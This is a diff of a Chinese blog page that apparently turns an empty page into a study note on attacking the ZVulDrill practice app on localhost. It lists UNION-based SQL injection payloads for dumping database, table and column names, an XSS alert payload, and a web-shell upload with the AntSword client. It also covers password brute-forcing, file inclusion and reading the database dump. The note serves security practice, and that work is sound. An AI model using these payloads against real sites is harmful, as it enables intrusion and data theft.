@@ -22,19 +22,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="为什么不拉弟弟一把呢">
-<meta property="og:type" content="website">
-<meta property="og:title" content="resources">
-<meta property="og:url" content="http://example.com/resources/index.html">
+  <meta name="description" content="zvuldrill测试与使用sql注入搜索框注入URL：’http:&#x2F;&#x2F;localhost&#x2F;ZVulDrill&#x2F;search.php?search&#x3D;1&#39;加入‘；’后报错，可能存在sql注入漏洞没过滤，1’ order by  5报错。回显点为2.3； 爆库名1’union select 1,database(),3,4 #库名为zvuldrill 爆表名1’union select 1,g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZVuldrill学习">
+<meta property="og:url" content="http://example.com/2021/11/01/2021-11-1-6%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="灵能对抗实验室">
-<meta property="og:description" content="为什么不拉弟弟一把呢">
+<meta property="og:description" content="zvuldrill测试与使用sql注入搜索框注入URL：’http:&#x2F;&#x2F;localhost&#x2F;ZVulDrill&#x2F;search.php?search&#x3D;1&#39;加入‘；’后报错，可能存在sql注入漏洞没过滤，1’ order by  5报错。回显点为2.3； 爆库名1’union select 1,database(),3,4 #库名为zvuldrill 爆表名1’union select 1,g">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-10-19T05:20:44.000Z">
-<meta property="article:modified_time" content="2021-10-19T05:20:44.903Z">
+<meta property="article:published_time" content="2021-11-01T07:19:15.000Z">
+<meta property="article:modified_time" content="2021-11-01T07:24:56.170Z">
 <meta property="article:author" content="hanbaiGG">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/resources/">
+<link rel="canonical" href="http://example.com/2021/11/01/2021-11-1-6%E7%AC%94%E8%AE%B0/">
 
 
 <script id="page-configurations">
@@ -42,13 +42,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>resources | 灵能对抗实验室
-</title>
+  <title>ZVuldrill学习 | 灵能对抗实验室</title>
   
 
 
@@ -165,43 +164,89 @@
       <div class="main-inner">
         <div class="content-wrap">
           
-  
-  
 
-          <div class="content page posts-expand">
+          <div class="content post posts-expand">
             
 
     
-    
-    
-    <div class="post-block" lang="zh-CN">
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-6%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ZVuldrill学习
+        </h1>
 
-<h1 class="post-title" itemprop="name headline">resources
-</h1>
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
 
-<div class="post-meta">
+              <time title="创建时间：2021-11-01 15:19:15 / 修改时间：15:24:56" itemprop="dateCreated datePublished" datetime="2021-11-01T15:19:15+08:00">2021-11-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="zvuldrill测试与使用"><a href="#zvuldrill测试与使用" class="headerlink" title="zvuldrill测试与使用"></a>zvuldrill测试与使用</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>URL：’<a target="_blank" rel="noopener" href="http://localhost/ZVulDrill/search.php?search=1&#39;">http://localhost/ZVulDrill/search.php?search=1&#39;</a><br>加入‘；’后报错，可能存在sql注入漏洞<br>没过滤，1’ order by  5报错。<br>回显点为2.3；</p>
+<h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p>1’union select 1,database(),3,4 #<br>库名为zvuldrill</p>
+<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>1’union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#</p>
+<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>1’union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’admin’#</p>
+<h3 id="登录框注入"><a href="#登录框注入" class="headerlink" title="登录框注入"></a>登录框注入</h3><p>万能密码登录admin</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h3 id="搜索框注入-1"><a href="#搜索框注入-1" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>search=’<script>alert('你好')</script>‘成功</p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>“<a target="_blank" rel="noopener" href="http://127.0.0.1/ZVulDrill/admin/login.php&quot;%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92">http://127.0.0.1/ZVulDrill/admin/login.php&quot;明文传递</a><br>burp爆破密码为admin</p>
+<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>头像上传shell.php无过滤<br>在images文件夹下用蚁剑链接</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>about界面f变量可包含任意文件</p>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>可访问zvuldrill.sql获取admin信息<br>##</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/01/2021-11-1-5wp/" rel="prev" title="【极客大挑战2019】havefunGet传参">
+      <i class="fa fa-chevron-left"></i> 【极客大挑战2019】havefunGet传参
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
-</div>
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
-          
-      </div>
-      
-      
-      
-    </div>
-    
-
-    
-    
-    
 
 
           </div>
@@ -257,6 +302,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#zvuldrill%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">zvuldrill测试与使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">搜索框注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">爆库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">爆表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">爆字段</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E6%A1%86%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">登录框注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">1.2.</span> <span class="nav-text">xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E6%A1%86%E6%B3%A8%E5%85%A5-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">搜索框注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.3.</span> <span class="nav-text">弱口令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.4.</span> <span class="nav-text">任意文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.5.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">1.6.</span> <span class="nav-text">目录遍历</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
